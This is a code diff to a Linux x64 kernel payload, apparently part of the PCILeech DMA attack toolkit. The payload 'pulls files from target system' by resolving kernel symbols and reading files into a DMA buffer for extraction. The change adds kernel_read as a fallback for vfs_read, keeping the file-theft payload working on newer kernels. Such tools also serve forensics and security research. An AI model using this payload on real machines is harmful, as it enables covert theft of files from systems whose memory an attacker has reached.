@@ -1,7 +1,7 @@
 // lx64_filepull.c : kernel code to pull files from target system.
 // Compatible with Linux x64.
 //
-// (c) Ulf Frisk, 2016
+// (c) Ulf Frisk, 2016-2021
 // Author: Ulf Frisk, pcileech@frizk.net
 //
 // compile with:
@@ -19,20 +19,23 @@ typedef struct tdFN2 {
 	QWORD filp_close;
 	QWORD filp_open;
 	QWORD vfs_read;
+	QWORD kernel_read;
 	QWORD memcpy;
 } FN2, *PFN2;
 
 BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
-	QWORD NAMES[4];
+	QWORD NAMES[5];
 	CHAR str_filp_close[] = {'f', 'i', 'l', 'p', '_', 'c', 'l', 'o', 's', 'e', 0};
 	CHAR str_filp_open[] = { 'f', 'i', 'l', 'p', '_', 'o', 'p', 'e', 'n', 0 };
 	CHAR str_vfs_read[] = { 'v', 'f', 's', '_', 'r', 'e', 'a', 'd', 0 };
+	CHAR str_kernel_read[] = { 'k', 'e', 'r', 'n', 'e', 'l', '_', 'r', 'e', 'a', 'd', 0 };
 	CHAR str_memcpy[] = { 'm', 'e', 'm', 'c', 'p', 'y', 0 };
 	NAMES[0] = (QWORD)str_filp_close;
 	NAMES[1] = (QWORD)str_filp_open;
 	NAMES[2] = (QWORD)str_vfs_read;
-	NAMES[3] = (QWORD)str_memcpy;
-	return LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)NAMES, (QWORD)pfn2, 4);
+	NAMES[3] = (QWORD)str_kernel_read;
+	NAMES[4] = (QWORD)str_memcpy;
+	return LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)NAMES, (QWORD)pfn2, 5);
 }
 
 VOID c_EntryPoint(PKMDDATA pk)
@@ -51,7 +54,13 @@ VOID c_EntryPoint(PKMDDATA pk)
 		return;
 	}
 	while(TRUE) {
-		pk->dataOutExtraLength = SysVCall(fn2.vfs_read, hFile, pk->DMAAddrVirtual + pk->dataOutExtraOffset, pk->dataOutExtraLengthMax, &qwOffset);
+		pk->dataOutExtraLength = SysVCall(
+			fn2.kernel_read ? fn2.kernel_read : fn2.vfs_read,
+			hFile,
+			pk->DMAAddrVirtual + pk->dataOutExtraOffset,
+			pk->dataOutExtraLengthMax,
+			&qwOffset
+		);
 		if(pk->dataOutExtraLength < pk->dataOutExtraLengthMax) {
 			break;
 		}
